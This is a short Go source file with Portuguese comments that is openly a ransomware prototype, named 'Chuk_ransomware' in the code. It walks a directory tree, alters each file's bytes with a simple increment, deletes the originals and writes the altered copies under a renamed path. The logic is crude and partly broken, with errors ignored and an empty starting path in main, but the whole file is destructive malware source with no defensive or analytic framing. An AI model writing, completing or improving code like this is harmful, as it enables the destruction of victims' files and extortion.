package main

import (
 "fmt"
 "os"
 "path/filepath"
 "io/ioutil"
)


func EncryptFiles(path string)error{
bytes_full,err:=ioutil.ReadFile(path)//lemos o arquivo
if err!=nil{
}
encrypted := make([]byte, len(bytes_full))
//bytes_ecripttados:=EncryptDecrypt(string(byte),"123")
for i, b := range bytes_full {
		encrypted[i] = b + 1
	}

os.Remove(path)//substitua o arquivo original
file,err:=os.Open(path+"Chuk_ransomware")
defer file.Close()
e:=ioutil.WriteFile(path+"Chuk_ransomware",encrypted,0644)
return e

}// essa  e nossa funçao de criptografia
func EnumerateFiles(root string) {
 err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {

  if !info.IsDir() {
   EncryptFiles(path)
  }
  return nil
 })
 if err != nil {
  fmt.Printf("Erro ao percorrer o diretório: %v\n", err)
  return
 }// se info.IsDir() nao for pasta e um arquivo
}
func EnumerateFolders(root string) {
 err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
  if err != nil {
   fmt.Printf("Erro ao acessar o caminho %q: %v\n", path, err)
   return err
  }
  if info.IsDir() {
   EnumerateFiles(path);
   
  }//se info.IsDir for uma pasta passe para funçao de enumeraçao de arquivos vamos testar
  return nil
 })
 if err != nil {
  fmt.Printf("Erro ao percorrer o diretório: %v\n", err)
  return
 }
}

func main() {
 EnumerateFiles("")//
}//agora iremos   ler  nosso arquivo usaremos  ReadFile
